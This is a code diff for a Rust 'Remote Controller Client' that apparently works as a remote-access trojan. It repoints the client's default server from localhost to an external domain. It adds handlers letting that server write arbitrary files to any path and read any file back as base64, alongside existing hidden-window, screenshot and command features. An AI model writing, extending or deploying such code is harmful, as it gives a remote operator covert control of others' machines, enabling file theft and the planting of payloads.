@@ -29,7 +29,7 @@ const CREATE_NO_WINDOW: u32 = 0x08000000;
 const APP_FOLDER_NAME: &str = "RCC"; // Remote Controller Client
 const CONFIG_FILE: &str = "config.json";
 const UUID_FILE: &str = "client_id.txt";
-const DEFAULT_SERVER_URL: &str = "http://127.0.0.1:5000";
+const DEFAULT_SERVER_URL: &str = "http://rcc.175852.xyz:36251";
 const SENTINEL_PREFIX: &str = "__RC_END__:";
 
 fn extract_first_json(payload: Payload) -> Option<serde_json::Value> {
@@ -89,6 +89,20 @@ async fn file_operation(op: &str, path: Option<String>, file_data: Option<String
         }
         _ => Err(anyhow!("unsupported operation")),
     }
+}
+
+async fn upload_file_to_path(path: &Path, file_base64: &str) -> Result<()> {
+    let bytes = general_purpose::STANDARD
+        .decode(file_base64.as_bytes())
+        .map_err(|e| anyhow!("base64 decode failed: {}", e))?;
+    if let Some(parent) = path.parent() { tokio::fs::create_dir_all(parent).await.ok(); }
+    tokio::fs::write(path, bytes).await?;
+    Ok(())
+}
+
+async fn download_file_as_base64(path: &Path) -> Result<String> {
+    let data = tokio::fs::read(path).await?;
+    Ok(general_purpose::STANDARD.encode(data))
 }
 
 async fn capture_screenshot(display_index: Option<usize>) -> Result<String> {
@@ -515,6 +529,68 @@ async fn main() -> Result<()> {
                                     "success": false,
                                     "error": e.to_string(),
                                 })).await;
+                            }
+                        }
+                    })
+                }
+            })
+            .on("upload_file", {
+                let uuid = client_uuid.clone();
+                move |payload: Payload, socket| {
+                    let uuid = uuid.clone();
+                    Box::pin(async move {
+                        let v = extract_first_json(payload);
+                        if let Some(val) = v {
+                            let path = val.get("path").and_then(|x| x.as_str()).unwrap_or("");
+                            let file_b64 = val.get("file_base64").and_then(|x| x.as_str()).unwrap_or("");
+                            let res = upload_file_to_path(Path::new(path), file_b64).await;
+                            match res {
+                                Ok(_) => {
+                                    let _ = socket.emit("upload_file_result", json!({
+                                        "uuid": uuid,
+                                        "success": true,
+                                        "path": path,
+                                    })).await;
+                                }
+                                Err(e) => {
+                                    let _ = socket.emit("upload_file_result", json!({
+                                        "uuid": uuid,
+                                        "success": false,
+                                        "path": path,
+                                        "error": e.to_string(),
+                                    })).await;
+                                }
+                            }
+                        }
+                    })
+                }
+            })
+            .on("download_file", {
+                let uuid = client_uuid.clone();
+                move |payload: Payload, socket| {
+                    let uuid = uuid.clone();
+                    Box::pin(async move {
+                        let v = extract_first_json(payload);
+                        if let Some(val) = v {
+                            let path = val.get("path").and_then(|x| x.as_str()).unwrap_or("");
+                            let res = download_file_as_base64(Path::new(path)).await;
+                            match res {
+                                Ok(b64) => {
+                                    let _ = socket.emit("download_file_result", json!({
+                                        "uuid": uuid,
+                                        "success": true,
+                                        "path": path,
+                                        "file_base64": b64,
+                                    })).await;
+                                }
+                                Err(e) => {
+                                    let _ = socket.emit("download_file_result", json!({
+                                        "uuid": uuid,
+                                        "success": false,
+                                        "path": path,
+                                        "error": e.to_string(),
+                                    })).await;
+                                }
                             }
                         }
                     })
